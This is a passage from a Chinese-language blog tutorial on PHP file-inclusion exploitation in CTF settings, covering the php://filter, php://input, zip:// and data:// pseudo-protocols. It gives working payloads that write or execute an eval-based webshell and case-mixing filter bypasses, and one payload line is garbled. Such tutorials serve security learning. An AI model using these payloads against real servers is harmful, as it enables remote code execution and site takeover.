+<p>用法：file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p>
+<h3 id="php-协议（fliter-input）"><a href="#php-协议（fliter-input）" class="headerlink" title="php:&#x2F;&#x2F;协议（fliter||input）"></a>php:&#x2F;&#x2F;协议（fliter||input）</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p>
+<p>php:&#x2F;&#x2F;filter用法：</p>
+<p>我们利用文件包含去打开一个php文件，无法直接将代码显示在页面上，但是可以使用php:&#x2F;&#x2F;filter</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=文件路径<br><br>如果php被过滤，使用大小写混用绕过，以下伪协议都可<br>?<span class="hljs-built_in">file</span>=PhP://<span class="hljs-built_in">filter</span><br></code></pre></td></tr></table></figure>
+
+<p>php:&#x2F;&#x2F;input用法：</p>
+<p>利用该方法可以直接写入php文件，现在url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//大小写混用绕过</span><br>?file=PhP:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure>
+
+<p>发送报文，用蚁剑连接即可</p>
+<h3 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
+<pre><code>zip://中只能传入绝对路径。
+要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）
+只需要是zip的压缩包即可，后缀名可以任意更改。
+相同的类型还有zlib://和bzip2://
+</code></pre>
+<p>zip:&#x2F;&#x2F;协议用法：</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">例如：<br>zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://<span class="hljs-symbol">D</span>:\<span class="hljs-number">1.</span>zip<span class="hljs-comment">%23phpinfo.txt</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p><strong>ata:&#x2F;&#x2F;</strong> 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>利用data:&#x2F;&#x2F;伪协议可以达到直接执行php代码的效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ，">?file=data://text/plain,&lt;?php                                                           ?&gt;&#x27;);?&gt;<br>?file=data://text/plain,&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;<br>//如果此处对特殊字符进行了过滤，还可以通过base64代码编码后再输入<br>data://text/plain;base64,编码后的代码<br><br>//如果此处&quot;php&quot;被过滤，可以使用大小写混用绕过<br>?file=data://text/plain,&lt;?PhP @eval($_POST[&quot;mixbp&quot;])?&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="伪协议利用条件和方法"><a href="#伪协议利用条件和方法" class="headerlink" title="伪协议利用条件和方法"></a>伪协议利用条件和方法</h3><p><img src="/../image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-2.png"></p>
+<p>详解地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
+            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
+            script.setAttribute('data-category', "Announcements");
+            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "0");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "noborder_dark");
+            script.setAttribute('data-lang', "zh-CN");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©MIXBP 2024
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/background.jpg);
+    }
+    
+    
+    #post .index {
+        background: url(/img/background2.jpg);
+    }
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/bjtp.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
+    
+</div>
+
+
+</html>
